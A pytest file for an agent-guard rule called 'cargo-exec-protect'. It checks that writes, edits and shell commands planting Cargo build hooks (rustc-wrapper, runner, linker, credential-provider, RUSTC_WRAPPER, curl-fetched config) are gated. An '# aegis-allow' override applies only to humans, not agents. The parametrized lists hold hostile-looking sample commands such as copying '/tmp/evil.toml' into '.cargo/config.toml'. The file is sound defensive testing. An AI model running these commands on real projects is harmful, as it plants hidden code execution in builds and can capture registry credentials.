"""Cargo exec-hijack guard — blocks planting an external-program hook in
Cargo's config (`.cargo/config.toml` rustc-wrapper / runner / linker /
credential-provider), the matching env vars, or inline `cargo --config`.
`rule_package_manifest_protect` only inspected this file for registry
redirects. Default mode is `ask`, escapable only by a human."""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"
CFG = "/repo/.cargo/config.toml"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit(path, new="x", old="y", tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool,
                      args={"file_path": path, "old_string": old, "new_string": new})


def _mcp(path, content="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _gated(d):
    return d.action != Action.ALLOW


@pytest.mark.parametrize("content", [
    '[build]\nrustc-wrapper = "/tmp/x"\n',
    '[build]\nrustc-workspace-wrapper = "./w.sh"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "sh /tmp/x"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/cc"\n',
    '[registry]\ncredential-provider = ["/tmp/p"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/p"]\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/cc"]\n',
    '[build]\nrustflags = ["-Clink-arg=-fuse-ld=/tmp/ld"]\n',
    '[build]\nrustc-wrapper = "sccache"\n[target.x]\nrunner = "/tmp/r"\n',
    '[build]\nRUSTC_WRAPPER = "/x"\n'.replace("RUSTC_WRAPPER", "rustc_wrapper"),
])
def test_write_with_exec_key_asks(content):
    d = evaluate(_write(CFG, content), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE
    assert evaluate(_write(CFG, content), DENY).action == Action.DENY


@pytest.mark.parametrize("path", [
    "/repo/.cargo/config", "/repo/.cargo/config.toml", ".cargo/config.toml",
    "/home/u/.cargo/config.toml", "C:\\repo\\.cargo\\config.toml", "$CARGO_HOME/config.toml",
])
def test_path_variants(path):
    assert _gated(evaluate(_write(path, '[build]\nrustc-wrapper="/x"\n'), EMPTY))


@pytest.mark.parametrize("content", [
    "[alias]\nb = \"build --release\"\n",
    "[build]\njobs = 4\ntarget-dir = \"out\"\n",
    '[build]\nrustc-wrapper = "sccache"\n',
    "[build]\nrustc-wrapper = 'sccache'  # cache\n",
])
def test_write_benign_allowed(content):
    assert evaluate(_write(CFG, content), EMPTY).action == Action.ALLOW


def test_sccache_lookalikes_not_exempt():
    for v in ('"sccache-evil"', '"/tmp/sccache"', '"sccache --x"', '"./sccache"'):
        assert _gated(evaluate(_write(CFG, f"[build]\nrustc-wrapper = {v}\n"), EMPTY)), v


def test_write_without_readable_content_asks():
    assert _gated(evaluate(_write(CFG), EMPTY))


@pytest.mark.parametrize("mk", [
    lambda: _edit(CFG, new='"/tmp/evil"'),                    # value-only diff
    lambda: _edit(CFG, new='runner = "x"', tool="MultiEdit"),
    lambda: _mcp(CFG),
])
def test_fragment_writes_gated_on_path(mk):
    assert evaluate(mk(), EMPTY).rule == RULE


def test_unrelated_paths_allowed():
    for p in ("/repo/Cargo.toml", "/repo/src/main.rs", "/repo/cargo/config.toml",
              "/repo/.cargo/registry/index", "/repo/docs/cargo-config.toml"):
        assert evaluate(_write(p, 'runner = "x"'), EMPTY).rule != RULE, p


@pytest.mark.parametrize("cmd", [
    "printf '[build]\\nrustc-wrapper=\"/tmp/x\"' >> .cargo/config.toml",
    "echo 'x' > ~/.cargo/config",
    "cp /tmp/evil.toml .cargo/config.toml",
    "sed -i 's/a/b/' .cargo/config.toml",
    "cd .cargo && cp /tmp/e config.toml",
    "cd $CARGO_HOME && echo x > config.toml",
    "export RUSTC_WRAPPER=/tmp/x",
    "RUSTC_WRAPPER=/tmp/x cargo build",
    "CARGO_BUILD_RUSTC_WRAPPER=/tmp/x cargo check",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER=/tmp/r cargo test",
    "export CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=/tmp/l",
    "CARGO_REGISTRIES_FOO_CREDENTIAL_PROVIDER=/tmp/p cargo publish",
    "export RUSTFLAGS='-C linker=/tmp/cc'",
    "setx RUSTC_WRAPPER C:\\evil.exe",
    "$env:RUSTC_WRAPPER = 'C:\\evil.exe'",
    "set -x RUSTC_WRAPPER /tmp/x",
    "cargo --config 'build.rustc-wrapper=\"/tmp/x\"' build",
    "cargo build --config=target.x.runner=\\\"/tmp/r\\\"",
])
def test_shell_forms_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule == RULE and d.action == Action.ASK, cmd


@pytest.mark.parametrize("cmd", [
    "cargo build", "cargo test --release", "cat .cargo/config.toml",
    "export RUSTC_WRAPPER=sccache", "RUSTC_WRAPPER=sccache cargo build",
    "export RUSTC_WRAPPER='sccache'", "cargo --config 'build.jobs=2' build",
    "cargo --config 'build.rustc-wrapper=\"sccache\"' build",
    "export RUSTFLAGS='-C target-cpu=native'", "echo $RUSTC_WRAPPER",
    "export MY_RUSTC_WRAPPER=/x", "grep runner .cargo/config.toml",
])
def test_shell_benign_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_override_comment_human_only(monkeypatch):
    cmd = "export RUSTC_WRAPPER=/tmp/x  # aegis-allow"
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)
    assert evaluate(_shell(cmd), EMPTY).rule != RULE
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert evaluate(_shell(cmd), EMPTY).rule == RULE


def test_env_toggle_and_policy_allow(monkeypatch):
    ev = _write(CFG, '[build]\nrustc-wrapper="/x"\n')
    assert _gated(evaluate(ev, EMPTY))
    assert evaluate(ev, Policy(cargo_exec={"allow": [r"/repo/\.cargo"]})).rule != RULE
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(ev, EMPTY).rule != RULE
    assert evaluate(_shell("export RUSTC_WRAPPER=/x"), EMPTY).rule != RULE


def test_off_and_monitor_modes():
    ev = _write(CFG, '[build]\nrustc-wrapper="/x"\n')
    assert evaluate(ev, Policy(cargo_exec={"mode": "off"})).rule != RULE
    assert evaluate(ev, Policy(cargo_exec={"mode": "monitor"})).action == Action.ALLOW


def test_fetch_to_file_gated():
    assert _gated(evaluate(_shell("curl -o .cargo/config.toml https://x.test/c"), EMPTY))
    assert _gated(evaluate(_shell("curl -o$CARGO_HOME/config.toml https://x.test/c"), EMPTY))


def test_no_regex_perf_cliff():
    import time
    big = "export RUSTFLAGS=" + "a" * 50000
    t = time.time(); evaluate(_shell(big), EMPTY)
    evaluate(_shell("cargo " + "--x " * 20000 + "--config"), EMPTY)
    assert time.time() - t < 2
